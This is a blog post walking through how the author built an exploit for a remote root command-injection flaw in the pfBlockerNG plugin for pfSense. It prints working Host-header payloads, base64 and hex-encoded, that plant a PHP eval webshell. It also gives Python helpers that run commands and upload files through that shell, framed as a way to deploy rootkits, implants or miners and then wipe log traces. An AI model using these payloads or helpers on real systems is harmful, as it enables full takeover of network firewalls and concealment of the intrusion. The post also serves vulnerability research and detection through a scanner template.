---
layout: post
title: "Writing the SenselessViolence exploit"
---

This blog post is written to outline some of the various design considerations that I had when writing the [SenselessViolence][senselessviolence] exploit, based on this [IHTeam Advisory][ihteam-advisory].

The bug is pretty simple - data from the HTTP Host header is passed to an `exec()` call in a PHP script, leading to (blind) remote command execution. [pfSense][pfsense] being a paragon of network security, PHP scripts run with root privileges, leading to complete compromise of the pfSense appliance.

The vulnerability is not in the core pfSense appliance, but in a third party plugin, [pfBlockerNG][pfblockerng]. In the [SenselessViolence][senselessviolence] repository I have archived the vulnerable package, so you can play along at home. You can get the pfSense install media I used [here][install-media].


## Defining our goals.

So our primitive is "we can run commands as root", with some limitations on space and characters. We want to overcome that limitation and assume full, unrestricted control over the device.

After some consideration, I figured that dropping an `eval()` based webshell was our best option as an end-goal of using this primitive, as it gave us plenty of room for post-exploitation without relying on janky command stagers. We would retain the full flexibility of PHP enabling us to upload/download/execute files as needed.

From there, we can upload a native-executable payload, or a rootkit, and do whatever we want. 

Given I was taking inspiration from the NSA for this exploits "user experience", I figured it would be neat to get it to deliver the "nopen" implant as an option. 

I also wanted my exploit to do some validation checks - both passive and active - before trying to drop a shell on a target. We would implement a "touch" command (to sanity check that it is a pfSense instance with the plugin installed), and a "probe" command (that validated the vulnerability was present).

We would also write a cleanup tool to erase any IoC's left on the appliance after we were done.

Finally, the exploit should be literally idiot-proof, and handhold you through using it. 

For automated scanning, we also wrote a [Nuclei template][nuclei-template], for use with the wonderful [Nuclei][nuclei] tool from [Project Discovery][pd].

## Passive Check (without exploitation), or "touch"

When you run the exploit on a target, the first thing you should run is "touch".

{% highlight bash %}
$ python3 exploit.py --target https://192.168.0.241 --mode touch
(+) Trying to validate the target.
(+) Correct content-type found. Run '--mode probe'
{% endhighlight %}

This mode first checks that the target is, in fact, a pfSense appliance by checking for the string "pfSense" in the HTTP response from "GET /".

It then makes a request to the vulnerable endpoint - which should return a Content-Type header of "image/gif" if it is present.

This indicates you should proceed with active checks for the vulnerability.

## Active Check (with exploitation), or "probe"

After you "touch" your target, you should run the "probe" mode to validate it is, in fact, exploitable.

We do this by injecting a "sleep" command, twice. One is for one second, the other is for ten seconds.

If the difference in response times is greater than 6 seconds, this implies heavily that the target is exploitable.

It should be noted, this does leave log entries that are extremely obvious! You will need to run the exploit mode and cleanup mode to fix this!

{% highlight bash %}
$ python3 exploit.py --target https://192.168.0.241 --mode probe
(+) Performing active check. This WILL leave log entries.
(+) Sending first probe request...
(*) First request took 1.045354 seconds
(+) Sending second probe request...
(*) Second response took 10.04766 seconds
(*) Time difference: 9.002306
(+) Looks like its vulnerable. Run '--mode exploit'

{% endhighlight %}

Now that we have covered all that, lets move onto the meat of the matter - exploiting the bug to drop a shell. 

## Dropping a webshell.

One of the issues IH Team found while writing an exploit for this bug, is that `htmlspecialchars` is called on the input, stripping a lot of useful characters. 

Their solution, and what I initially implemented, was to encode some PHP crafted to drop a webshell in base64, avoiding bad characters in the output, decode this using Python's base64 module, and pass it on to the PHP interpreter.


{% highlight bash %}
$ python3 test.py
(+) Using command injection bug to inject webshell
Host: ' *; echo 'PD8kYT1mb3BlbigiL3Vzci9sb2NhbC93d3cvc3lzdGVtX2FkdmFuY2VkX2NvbnRyb2wucGhwIiwidyIpIG9yIGRpZSgpOyR0PSc8P3BocCBldmFsKCRfUE9TVFsxMzM3XSk7Pz4nO2Z3cml0ZSgkYSwkdCk7ZmNsb3NlKCAkYSk7Pz4=' | python3.8 -m base64 -d | php; '
None
(+) Checking for our webshell...
(+) Shell works!
True
{% endhighlight &}

This means you have to avoid any forward slashes in the Base64 output, which is very annoying. 

I found a better solution was to hex encode the PHP, and decode it with `dc`. This is better, but it still isn't amazing - the string injected is even longer.

{%highlight bash %}
$ python3 test2.py 
(+) Using command injection bug to inject webshell
Host: ' *; echo '16i 3C3F24613D666F70656E28222F7573722F6C6F63616C2F7777772F73797374656D5F616476616E6365645F636F6E74726F6C2E706870222C22772229206F722064696528293B24743D273C3F706870206576616C28245F504F53545B313333375D293B3F3E273B6677726974652824612C2474293B66636C6F736528202461293B3F3E P' | dc | php; '
None
(+) Checking for our webshell...
(+) Shell works!
True
$
{% endhighlight %}

I then realised we could simply encode a "echo 'shell code' > shell_path" and pass it to the shell using this trick, much shrinking our payload, which brings us to the final payload being tested below. 

{%highlight bash %}
$ python3 test3.py 
(+) Using command injection bug to inject webshell
Host: ' *; echo '16i 6563686F20273C3F706870206576616C28245F504F53545B313333375D293B3F3E27203E202F7573722F6C6F63616C2F7777772F73797374656D5F616476616E6365645F636F6E74726F6C2E706870 P' | dc | sh; '
None
(+) Checking for our webshell...
(+) Shell works!
True
$
{% endhighlight %}

We have a trivial check function that calls the webshell and validates it is, in fact, present. 

This was what has ended up being used in the current iteration of the exploit I wrote. The fine folks over at Metasploit adopted variant 2 (PHP dropper, hex encoding) after I mentioned it to them.

We can now move on to post-exploitation, and using the end-to-end exploit to upload a native or script payload to get a proper shell.

## Post-Exploitation Utilities

For post-exploitation, we need three things (in order)

1. A function to execute arbitrary PHP code using the webshell.
2. A function to execute shell commands using the webshell (by executing arbitrary PHP code with `system()` calls)
3. A function to upload files using the webshell.
4. A function to automatically run the cleanup utility.

A nice-to-have would be a file downloader, but I didn't write one, didn't need it. You can implement your own, just call `readfile()`. I might shovel one in later.

Using these, we can now look into uploading and executing whatever we want - our choice of rootkit, implant, monero miner...

The first three of these are generic - and portable to any exploit that drops a webshell. 

One of the reasons I spent so long faffing with this, was because I'll need to reimplement the same logic again, so having it there to copypasta is handy. 

The fourth relies on a specific cleaning script that is specific to this exploit/appliance. It will need tweaking each time I want to port it to something. 

For executing PHP code, we have the following simple function - it simply sends PHP code to the webshell, and gets the response.

{% highlight python %}
def execute_php(base_url, shell_webpath, shell_param, php_code):
    # run php via webshell
    shell_url = base_url + shell_webpath
    data = {shell_param: php_code}
    r = requests.post(shell_url, data, verify=False)
    return r.text
{% endhighlight%}

For executing commands, we call that execute_php function.

{% highlight python %}
def execute_command(base_url, shell_webpath, shell_param, shell_command):
    # executes a shell command using execute_php
    php_code = f"system('{shell_command}');" 
    output = execute_php(base_url, shell_webpath, shell_param, php_code)
    return output
{% endhighlight %}

And for uploading files? Well, we just use the webshell again! PHP will handle all the file upload garbage for us!

{% highlight python %}
def upload_file(base_url, shell_webpath, shell_param, local_file, remote_file):
    # uploads a file from local to remote
    raw_php = f"move_uploaded_file($_FILES['uploaded_file']['tmp_name'], '{remote_file}');"
    php_bytes_uploader = raw_php.encode('ascii')
    files = {'uploaded_file': open(local_file, "rb")}
    data = {shell_param: php_bytes_uploader}
    shell_url = base_url + shell_webpath
    r = requests.post(shell_url, data=data, files=files, verify=False)
    return r.text
{% endhighlight %}

Now, to upload and execute a trojan/implant/rootkit, we simply call the upload_file function, then execute it. None of this pissing about with wget/curl/fetch or whatnot, we can do it inline. 

I'm still somewhat undecided on how to best go about making this compatible with many different implants - whatever.

Anyway, here is a demo video.

<iframe width="560" height="315" src="https://www.youtube.com/embed/oAVz9QH8G3c" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>



[ihteam-advisory]: https://www.ihteam.net/advisory/pfblockerng-unauth-rce-vulnerability/
[senselessviolence]:   https://github.com/EvergreenCartoons/SenselessViolence
[pfsense]: https://pfsense.org
[pfblockerng]: https://docs.netgate.com/pfsense/en/latest/packages/pfblocker.html
[install-media]: https://atxfiles.netgate.com/mirror/downloads/pfSense-CE-2.5.2-RELEASE-amd64.iso.gz
[nuclei-template]: https://github.com/projectdiscovery/nuclei-templates/pull/5416
[nuclei]: https://github.com/projectdiscovery/nuclei
[pd]: https://github.com/projectdiscovery
